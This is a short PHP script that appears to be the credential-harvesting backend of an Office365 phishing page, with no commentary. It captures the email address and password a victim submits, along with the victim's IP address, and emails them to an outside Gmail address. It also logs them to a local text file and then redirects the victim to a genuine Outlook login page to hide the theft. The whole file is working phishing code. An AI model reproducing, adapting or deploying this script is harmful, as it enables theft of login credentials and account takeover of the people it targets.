<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Office365 Info-----------------------\n";
$message .= "Email            : ".$_POST['userid']."\n";
$message .= "Password            : ".$_POST['formtext2']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY BURHAN FUDPAGES [.] Ru-------------\n";
$send = "saeedmusa123@gmail.com";
$subject = "Result from WEBMAIL1";
$headers = "From: Office365 Info<customer-support@mrs>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("use.txt","a");
fputs($fp,$message);
fclose($fp);
	
		   header("Location: https://outlook.office365.com/owa/live.ucl.ac.uk");

	 
?>
